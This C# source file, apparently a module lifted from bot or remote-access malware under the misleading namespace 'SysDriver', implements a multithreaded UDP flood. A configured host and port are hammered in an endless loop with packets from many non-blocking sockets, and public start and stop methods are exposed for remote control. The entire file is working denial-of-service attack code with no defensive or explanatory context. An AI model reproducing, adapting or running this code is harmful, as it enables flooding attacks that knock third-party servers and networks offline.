using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace SysDriver;

internal class nUDPFlood
{
	private class UDPRequest
	{
		private IPEndPoint IPEo;

		private int iPSize;

		private Socket[] pSocket;

		private int iUDPSockets;

		public UDPRequest(IPEndPoint tIPEo, int tUDPSockets, int tPSize)
		{
			IPEo = tIPEo;
			iUDPSockets = tUDPSockets;
			iPSize = tPSize;
		}

		public void Send()
		{
			while (true)
			{
				byte[] buffer = new byte[iPSize];
				try
				{
					pSocket = new Socket[iUDPSockets];
					for (int i = 0; i < iUDPSockets; i++)
					{
						pSocket[i] = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
						pSocket[i].Blocking = false;
						pSocket[i].SendTo(buffer, IPEo);
					}
					Thread.Sleep(100);
					for (int i = 0; i < iUDPSockets; i++)
					{
						if (pSocket[i].Connected)
						{
							pSocket[i].Disconnect(reuseSocket: false);
						}
						pSocket[i].Close();
						pSocket[i] = null;
					}
					pSocket = null;
				}
				catch
				{
					for (int i = 0; i < iUDPSockets; i++)
					{
						try
						{
							if (pSocket[i].Connected)
							{
								pSocket[i].Disconnect(reuseSocket: false);
							}
							pSocket[i].Close();
							pSocket[i] = null;
						}
						catch
						{
						}
					}
				}
			}
		}
	}

	private static ThreadStart[] tFloodingJob;

	private static Thread[] tFloodingThread;

	public static string sFHost;

	private static IPEndPoint IPEo;

	public static ushort uPort;

	public static int iPSize;

	private static UDPRequest[] UDPClass;

	public static int iThreads;

	public static int iUDPSockets;

	public static void StartUDPFlood()
	{
		try
		{
			IPEo = new IPEndPoint(Dns.GetHostEntry(sFHost).AddressList[0], uPort);
		}
		catch
		{
			IPEo = new IPEndPoint(IPAddress.Parse(sFHost), uPort);
		}
		tFloodingThread = new Thread[iThreads];
		tFloodingJob = new ThreadStart[iThreads];
		UDPClass = new UDPRequest[iThreads];
		for (int i = 0; i < iThreads; i++)
		{
			UDPClass[i] = new UDPRequest(IPEo, iUDPSockets, iPSize);
			tFloodingJob[i] = UDPClass[i].Send;
			tFloodingThread[i] = new Thread(tFloodingJob[i]);
			tFloodingThread[i].Start();
		}
	}

	public static void StopUDPFlood()
	{
		for (int i = 0; i < iThreads; i++)
		{
			try
			{
				tFloodingThread[i].Abort();
				tFloodingThread[i].Join();
			}
			catch
			{
			}
		}
	}
}
